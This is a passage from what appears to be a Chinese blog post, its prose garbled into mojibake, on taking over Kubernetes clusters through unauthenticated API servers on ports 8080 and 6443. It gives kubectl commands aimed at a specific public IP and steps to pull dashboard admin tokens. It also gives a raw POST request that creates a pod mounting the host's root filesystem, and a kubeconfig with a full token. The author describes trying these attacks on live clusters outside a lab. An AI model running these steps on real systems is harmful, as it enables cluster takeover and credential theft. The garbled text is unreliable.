sh</code></p><p>ç¬”è€…åœ¨æ‰§è¡Œäº¤äº’å‘½ä»¤çš„æ—¶å€™ï¼Œç”¨bashæ²¡æœ‰æˆåŠŸï¼Œåº”è¯¥æ˜¯å¯¹æ–¹çš„podç¯å¢ƒæ²¡æœ‰ï¼Œshå°±æœ‰äº†,è¿™æ ·å°±å¯ä»¥æ„‰å¿«çš„å‘½ä»¤æ‰§è¡Œäº†ã€‚è¿™äº›å‘½ä»¤çœ‹èµ·æ¥å’Œdockerå‘½ä»¤å·®ä¸å¤šã€‚</p><p><img src="/images/k8s/image-20231228101830688.png" alt="image-20231228101830688"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨metargetå®‰è£…ä¸€ä¸ªdvwaï¼Œæˆ–è€…phpçš„rceéƒ½å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#è¿™ä¸ªå‘½ä»¤ä¼šå®‰è£…ä¸€ä¸ªdvwaçš„podï¼ŒæŠŠè¿™ä¸ªpodæ”¾åˆ°metargetï¼ˆnamespaceï¼‰ä¸‹é¢</span><br><span class="line">#ä½†æ˜¯è¿™å‘½ä»¤ä¸ä¼šå°†dvwaçš„ç«¯å£æš´æ¼å‡ºæ¥</span><br><span class="line">./metarget appv install dvwa</span><br><span class="line"></span><br><span class="line">#æ‰§è¡Œ./metarget appv install dvwa --externalç›´æ¥å®‰è£…dvwaæ¼æ´ç¯å¢ƒåˆ°è„†å¼±çš„åº•å±‚åŸºç¡€è®¾æ–½ä¸Šï¼Œå¹¶ä»¥NodePortå½¢å¼å°†ç«¯å£æš´éœ²å‡ºæ¥ã€‚</span><br><span class="line">#ä¹Ÿå°±æ˜¯è¦åŠ ä¸ªå‚æ•°--external</span><br><span class="line">./metarget appv install thinkphp-5-0-23-rce --external</span><br></pre></td></tr></table></figure><p>ç¬”è€…åœ¨è¿™é‡Œæ­å»ºäº†ä¸€ä¸ªdvwa ä¸€ä¸ªthinkphpçš„RCEç”¨äºæµ‹è¯•ï¼Œæš´æ¼çš„ç«¯å£åˆ†åˆ«æ˜¯30000å’Œ30001</p><p><img src="/images/k8s/image-20231228104006919.png" alt="image-20231228104006919"></p><p><img src="/images/k8s/image-20231228104102865.png" alt="image-20231228104102865"></p><p>æœªæˆæƒæ¼æ´ä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ°çš„</p><p><img src="/images/k8s/image-20231228104156293.png" alt="image-20231228104156293"></p><p>å‘½ä»¤æ€»ç»“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl -s 27.223.94.14:8080 get node</span><br><span class="line">kubectl -s 27.223.94.14:8080 get namespace</span><br><span class="line">kubectl -s ip:8080 get pods -n metarget</span><br><span class="line">kubectl -s ip:8080 --namespace=kube-system exec -it kube-scheduler-racknerd-6d0a89 bash</span><br></pre></td></tr></table></figure><p>åœ¨å®æˆ˜ä¸­ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œ</p><h6 id="å¤±è´¥çš„å®æˆ˜"><a href="#å¤±è´¥çš„å®æˆ˜" class="headerlink" title="å¤±è´¥çš„å®æˆ˜"></a>å¤±è´¥çš„å®æˆ˜</h6><p><img src="/images/k8s/image-20231228111456328.png" alt="image-20231228111456328"></p><p>ä½†æ˜¯åœ¨æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œè¯•äº†å¥½å‡ ä¸ªpodéƒ½æ˜¾ç¤ºæ²¡æœ‰ç©ºé—´äº†ï¼Œä¸å¯æ€è®®</p><p><img src="/images/k8s/image-20231228111621099.png" alt="image-20231228111621099"></p><p>è¿˜æœ‰è¿™ç§ï¼Œåˆ—podä¸­ï¼Œpodæ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯æ‰§è¡Œçš„æ—¶å€™æ˜¾ç¤ºä¸å­˜åœ¨ï¼Œä¸ç†è§£ï¼Œå¯ä»¥podæ¸…ç©ºäº†ï¼Ÿ</p><p><img src="/images/k8s/image-20231228112827115.png" alt="image-20231228112827115"></p><p>è¿™ç§æ²¡æœ‰æƒé™çš„ï¼Œè¿™ç§å¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡ç« ï¼Œ<a href="https://blog.csdn.net/zhuyongru/article/details/114060199">https://blog.csdn.net/zhuyongru/article/details/114060199</a><br>å¤§è‡´æ„æ€å°±æ˜¯å¯¹æ–¹å¼€å¯äº†RBACè§„åˆ™ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯apiserveræ²¡æœ‰è®¿é—®kubelet IPIçš„æƒé™ï¼Œè¿™æ ·å°±403äº†</p><p><img src="/images/k8s/image-20231228135913246.png" alt="image-20231228135913246"></p><h6 id="æˆåŠŸ"><a href="#æˆåŠŸ" class="headerlink" title="æˆåŠŸ"></a>æˆåŠŸ</h6><p><img src="/images/k8s/image-20231228142255049.png" alt="image-20231228142255049"></p><h5 id="6443ç«¯å£æœªæˆæƒ"><a href="#6443ç«¯å£æœªæˆæƒ" class="headerlink" title="6443ç«¯å£æœªæˆæƒ"></a>6443ç«¯å£æœªæˆæƒ</h5><p>å¦‚æœä¸å°å¿ƒï¼Œå°†â€system:anonymousâ€ç”¨æˆ·ç»‘å®šåˆ°â€cluster-adminâ€ç”¨æˆ·ç»„ï¼Œä»è€Œä½¿6443 ç«¯å£å…è®¸åŒ¿åç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™å‘é›†ç¾¤å†…éƒ¨ä¸‹å‘æŒ‡ä»¤ï¼Œ<br>é»˜è®¤è®¿é—®6443ç«¯å£ä¼šæ˜¾ç¤º<img src="/images/k8s/image-20231228090722306.png" alt="image-20231228090722306"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;Status&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;status&quot;</span>: <span class="string">&quot;Failure&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;forbidden: User \&quot;system:anonymous\&quot; cannot get path \&quot;/\&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reason&quot;</span>: <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;details&quot;</span>: &#123;</span><br><span class="line">    </span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;code&quot;</span>: <span class="number">403</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®messageçš„å­—é¢æ„æ€ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œä¹Ÿå°±æ˜¯anonymousä¸èƒ½è®¿é—®è¿™ä¸ªpathï¼Œ<br>è¿™ä¸ªæ—¶å€™ç®¡ç†å‘˜ä¸å°å¿ƒä½¿ç”¨äº†å‘½ä»¤ï¼Œ<code>kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous</code><br>é‚£ä¹ˆå°±ä¼šå¯¼è‡´anonymouså¯ä»¥ä»»æ„è®¿é—®äº†ï¼Œ</p><p><code>https://ip:6443/api/v1/namespaces/default/pods</code><br>é€šè¿‡æµè§ˆå™¨è·å–åˆ°æ‰€æœ‰podsï¼Œ</p><p><img src="/images/k8s/image-20240102155136747.png" alt="image-20240102155136747"></p><p>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨äº†ï¼Œå’Œä¸Šé¢çš„8080ç«¯å£æœªæˆæƒåˆ©ç”¨æ–¹å¼å·®ä¸å¤š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è·å–åˆ°æ‰€æœ‰node</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get node</span><br><span class="line">#è·å–åˆ°æ‰€æœ‰namespace</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get namespace</span><br><span class="line">#è·å–é»˜è®¤podï¼Œæ³¨æ„è¿™é‡Œæ²¡æœ‰åŠ namespaceæ˜¯é»˜è®¤pod</span><br><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 get pods</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥æ³¨æ„åˆ°è®©è¾“å…¥è´¦æˆ·å¯†ç ï¼Œéšä¾¿è¾“å³å¯ã€‚</p><p><img src="/images/k8s/image-20240102161111140.png" alt="image-20240102161111140"></p><p><img src="/images/k8s/image-20240102161338261.png" alt="image-20240102161338261"></p><p>å¦‚æœåœ¨æŸ¥çœ‹namespaceçš„æ—¶å€™å‘ç°æœ‰dashboardçš„è¯ï¼Œé‚£ä¹ˆè¯´æ˜ç¯å¢ƒä¸­å­˜åœ¨é¢æ¿ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°é¢æ¿çš„tokenï¼Œæ¥ç™»å½•é¢æ¿ã€‚</p><p><img src="/images/k8s/image-20240102171909311.png" alt="image-20240102171909311"></p><p>å¯ä»¥çœ‹åˆ°æœ‰kubernetes-dashboardï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤åˆ°æµè§ˆå™¨ä¸­</p><p><code>https://ip:6443/api/v1/namespaces/kubernetes-dashboard/secrets/</code></p><p>ç»è¿‡æµ‹è¯•ï¼Œåœ¨å…¶ä¸­ä¼šæœ‰å¤šä¸ªpodsï¼Œå¸¦æœ‰admin-user-tokençš„åº”è¯¥å°±æ˜¯è¿™ä¸ªpodçš„tokenäº†ï¼Œæ‹¿å‡ºæ¥base64ä¸€ä¸‹ï¼Œä¸è¦è§£jwtï¼Œeyå¼€å¤´çš„å€¼ï¼Œ</p><p><img src="/images/k8s/image-20240102172332395.png" alt="image-20240102172332395"></p><p><img src="/images/k8s/image-20240102172520549.png" alt="image-20240102172520549"></p><p>å¦‚æœç¯å¢ƒå¯¹å¤–æ˜ å°„äº†é¢æ¿ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„‰å¿«çš„ç™»å½•äº†ã€‚æµ‹è¯•ç¯å¢ƒä¸­å¥½åƒéƒ½æ˜¯æ˜ å°„åˆ°9090ç«¯å£ã€‚<br>è¿™æ ·å°±ç›´æ¥æ‰˜ç®¡äº†æ•´ä¸ªk8sã€‚</p><p><img src="/images/k8s/image-20240102172819323.png" alt="image-20240102172819323"></p><p>è¿™é‡Œä¼šæœ‰å°ä¼™ä¼´æœ‰ç–‘é—®ï¼Œä¸Šé¢ç”¨kubectl â€“insecure-skip-tls-verify -s <a href="https://ip:6443/">https://ip:6443</a> -n kubeå‘½ä»¤æ‰“ç€æ‰“ç€ï¼Œæ€ä¹ˆè·³åˆ°ç”¨æµè§ˆå™¨è¯·æ±‚äº†ï¼Œè·å–tokenäº†ã€‚<br>è¿™é‡Œå…¶å®æ˜¯å› ä¸ºï¼Œç¬”è€…åœ¨è¿™é‡Œå¤ªèœäº†ï¼Œä¸Šé¢8080ç«¯å£çš„æœªæˆæƒåˆ©ç”¨å¯ä»¥è·å–åˆ°pods namespaceç­‰ä¿¡æ¯ï¼Œé‚£ä¾¿æ˜¯å¯ä»¥è·å–åˆ°tokençš„ï¼Œè¿™é‡Œæå‰è¯´ä¸€ä¸‹å…¶å®è·å–tokençš„ä½œç”¨å°±æ˜¯ç™»å½•é¢æ¿çš„ï¼Œä¸‹é¢ä¼šè¯´åˆ°ï¼Œåœ¨å®¿ä¸»ä¸»æœºä¸Šæ‰§è¡Œ<code>kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</code><br>ä¾¿å¯è·å–åˆ°tokenï¼Œå®ƒæ˜¯ç”¨æ¥ç™»å½•é¢æ¿çš„ï¼Œé‚£ä¹ˆåŒç†å¯å¾—ï¼Œå¦‚æœ6443ç«¯å£å­˜åœ¨æœªæˆæƒï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥è·å–tokenï¼Œç¬”è€…åœ¨è¿™é‡Œè¯•äº†å¥½å¤šç§linuxè½¬ä¹‰ï¼Œéƒ½æ²¡æœ‰æˆåŠŸï¼Œå¦‚æœæœ‰æˆåŠŸçš„å¤§å¸ˆå‚…å¯ä»¥ç•™è¨€ï¼Œæ„Ÿè°¢æ„Ÿè°¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify -s https://ip:6443 -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admpath=\&quot;&#123;.secrets[0].name&#125;\&quot;) -o go-template=\&quot;&#123;&#123;.data.token \| base64decode&#125;&#125;\&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240102212933474.png" alt="image-20240102212933474"></p><p>è¿™é‡Œå¦‚æœæ²¡æœ‰k8é¢æ¿çš„è¯ï¼Œä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œç›´æ¥ä½¿ç”¨æµè§ˆå™¨åˆ›å»ºpodsä¹Ÿå¯è¡Œï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v1/namespaces/default/pods</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ip:6443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1180</span><br><span class="line"></span><br><span class="line"><span class="swift">&#123;</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Pod&quot;</span>,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;metadata&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;annotations&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">            <span class="string">&quot;kubectl.kubernetes.io/last-applied-configuration&quot;</span>: <span class="string">&quot;&#123;<span class="subst">\&quot;</span>apiVersion<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>v1<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>kind<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>Pod<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>metadata<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>annotations<span class="subst">\&quot;</span>:&#123;&#125;,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>test-44441<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>namespace<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>default<span class="subst">\&quot;</span>&#125;,<span class="subst">\&quot;</span>spec<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>containers<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>image<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>nginx:1.14.2<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>test-44441<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>volumeMounts<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>mountPath<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>/host<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>host<span class="subst">\&quot;</span>&#125;]&#125;],<span class="subst">\&quot;</span>volumes<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>hostPath<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>path<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>/<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>type<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>Directory<span class="subst">\&quot;</span>&#125;,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>host<span class="subst">\&quot;</span>&#125;]&#125;&#125;<span class="subst">\n</span>&quot;</span></span></span><br><span class="line"><span class="swift">        &#125;,</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test-44441&quot;</span>,</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;default&quot;</span></span></span><br><span class="line"><span class="swift">    &#125;,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;spec&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;containers&quot;</span>: [</span></span><br><span class="line"><span class="swift">            &#123;</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;image&quot;</span>: <span class="string">&quot;nginx:1.14.2&quot;</span>,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test-44441&quot;</span>,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;volumeMounts&quot;</span>: [</span></span><br><span class="line"><span class="swift">                    &#123;</span></span><br><span class="line"><span class="swift">                        <span class="string">&quot;mountPath&quot;</span>: <span class="string">&quot;/host&quot;</span>,</span></span><br><span class="line"><span class="swift">                        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;host&quot;</span></span></span><br><span class="line"><span class="swift">                    &#125;</span></span><br><span class="line"><span class="swift">                ]</span></span><br><span class="line"><span class="swift">            &#125;</span></span><br><span class="line"><span class="swift">        ],</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;volumes&quot;</span>: [</span></span><br><span class="line"><span class="swift">            &#123;</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;hostPath&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">                    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span>,</span></span><br><span class="line"><span class="swift">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Directory&quot;</span></span></span><br><span class="line"><span class="swift">                &#125;,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;host&quot;</span></span></span><br><span class="line"><span class="swift">            &#125;</span></span><br><span class="line"><span class="swift">        ]</span></span><br><span class="line"><span class="swift">    &#125;</span></span><br><span class="line"><span class="swift">&#125;</span></span><br><span class="line"><span class="swift"></span></span><br></pre></td></tr></table></figure><p>å›æ˜¾201å°±è¡¨ç¤ºåˆ›å»ºæˆåŠŸäº†ï¼Œ</p><p><img src="/images/k8s/image-20240103094619945.png" alt="image-20240103094619945"></p><p><img src="/images/k8s/image-20240103094607986.png" alt="image-20240103094607986"></p><p>æµè§ˆå™¨è®¿é—®ä¹Ÿå°±å¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿå¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><p><img src="/images/k8s/image-20240103094714518.png" alt="image-20240103094714518"></p><p>ç¬”è€…åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œä¸€å¼€å§‹åˆ›å»ºpodä¼šå¤±è´¥ï¼Œ<br><img src="/images/k8s/image-20240103094849583.png" alt="image-20240103094849583"></p><p>è¾“å…¥kubectl describe pod test-44441 â€“namespace defaultï¼Œå¯ä»¥çœ‹åˆ°ç›¸å…³çš„æŠ¥é”™</p><p><img src="/images/k8s/image-20240103095034621.png" alt="image-20240103095034621"></p><p>æ˜¾ç¤ºtomanyrequestï¼Œåº”è¯¥æ˜¯æ‹‰å–çš„å¤ªå¿«äº†ï¼Œ</p><p><img src="/images/k8s/image-20240103095146163.png" alt="image-20240103095146163"></p><p>dockerå®˜æ–¹çš„è¯´æ³•æ˜¯æ²¡ç™»é™†6å°æ—¶æ‹‰å»100ï¼Œç™»å½•äº†ä¹‹å6å°æ—¶æ‹‰å»200ã€‚åº”è¯¥æ˜¯æ‹‰å»å¤ªå¿«äº†ã€‚<br>åœ¨è¯¥æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤<code>kubectl --insecure-skip-tls-verify -s https://ip:6443 --namespace=default exec -it test-44441 bash</code></p><p><img src="/images/k8s/image-20240103100033394.png" alt="image-20240103100033394"></p><p>æ„Ÿè§‰åœ¨å®æˆ˜ä¸­ï¼Œè¿™ç§åˆ›å»ºpodçš„æ“ä½œç”¨ä¸ä¸Šï¼Œå› ä¸ºè¿™é‡Œæ¼æ´æ˜¯æœªæˆæƒï¼Œè€Œæœªæˆæƒå¯ä»¥æ¥ç®¡æ•´ä¸ªk8sé›†ç¾¤ï¼Œé‚£ä¹ˆå†å»åˆ›å»ºä¸€ä¸ªpodèµ·æ­¥å¤šæ­¤ä¸€ä¸¾ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ç”¨åšæ˜¯ä¸€ä¸ªè·³æ¿ï¼Œæˆ–è€…å…¥å£æœºã€‚</p><h5 id="å¤±è´¥çš„ä»podåˆ°api-server"><a href="#å¤±è´¥çš„ä»podåˆ°api-server" class="headerlink" title="å¤±è´¥çš„ä»podåˆ°api server"></a>å¤±è´¥çš„ä»podåˆ°api server</h5><p>çœ‹äº†è¿™ä¸ªå¤§å¸ˆå‚…çš„æ–‡ç« </p><p><code>https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/</code></p><p>å¤§å¸ˆå‚…çš„æ–‡ç« ï¼Œæ˜¯æ‰“åä¸ºäº‘çš„æ¯”èµ›ï¼Œåœ¨ä¸€ä¸ªpodä¸‹é¢æ‹¿åˆ°äº†ä¸€ä¸ªshellï¼Œç„¶åä»è¿™ä¸ªpodæŸ¥çœ‹/run/secrets/kubernetes.io/serviceaccount/tokenæ–‡ä»¶è·å–äº†api-serverçš„tokenï¼Œç„¶åé€šè¿‡è¿™ä¸ªtoken æ¥ç®¡æ•´ä¸ªé›†ç¾¤ï¼Œä»è€Œè¾¾åˆ°äº†æ¯”èµ›çš„éé¢„æœŸã€‚<br>é‚£ä¹ˆæ€è€ƒï¼Œè¿™ä¸ªé—®é¢˜èƒ½ä¸èƒ½åœ¨æµ‹è¯•ä¸­åˆ©ç”¨ã€‚ç»è¿‡æµ‹è¯•æ˜¯ä¸å¯ä»¥çš„ã€‚ä¹Ÿä¸èƒ½è¯´ä¸å¯ä»¥ï¼Œåªèƒ½è¯´é‰´æƒä¸å¤Ÿï¼Œå¸ˆå‚…çš„æ¯”èµ›ç¯å¢ƒï¼Œæ˜¯ç®¡ç†å‘˜é…ç½®é”™è¯¯æ‰€å¯¼è‡´çš„ã€‚</p><h6 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h6><p>é¦–å…ˆå¦‚æœæˆ‘ä»¬è¿›å»ä¸€ä¸ªpodä¹‹åï¼Œæˆ‘ä»¬æŸ¥çœ‹è¿™ä¸ª/run/secrets/kubernetes.io/serviceaccount/tokenæ–‡ä»¶ï¼Œæ˜¯æ‰€æœ‰æƒé™éƒ½å¯ä»¥æŸ¥çœ‹çš„ï¼Œ777ã€‚<br>å¤§å¸ˆå‚…åœ¨æ‰“æ¯”èµ›æ—¶åˆ›å»ºçš„é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">clusters:</span><br><span class="line">- cluster:</span><br><span class="line">    insecure-skip-tls-verify: true</span><br><span class="line">    server: https://10.247.0.1</span><br><span class="line">  name: cluster-name</span><br><span class="line">contexts:</span><br><span class="line">- context:</span><br><span class="line">    cluster: cluster-name</span><br><span class="line">    namespace: test</span><br><span class="line">    user: admin</span><br><span class="line">  name: admin</span><br><span class="line">current-context: admin</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users:</span><br><span class="line">- name: admin</span><br><span class="line">  user:</span><br><span class="line">    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231228170140604.png" alt="image-20231228170140604"></p><p>å¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶ä¸­çš„æƒé™æ˜¯adminçš„ï¼Œæ‰€ä»¥ï¼Œæƒ³ä½¿ç”¨è¿™ä¸ªpodæ‹¿åˆ°shellï¼Œè·å–tokenæ‰“apiserverã€‚</p><p>è¿™é‡Œç¬”è€…åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œä¼¼ä¹è¿™ä¸ªpodè¿æ¥ä¸åˆ°apiserverï¼Œä½†æ˜¯apiserveræ˜¾ç¤ºçš„ç¡®å®æ˜¯è¿™é‡Œ</p><p><img 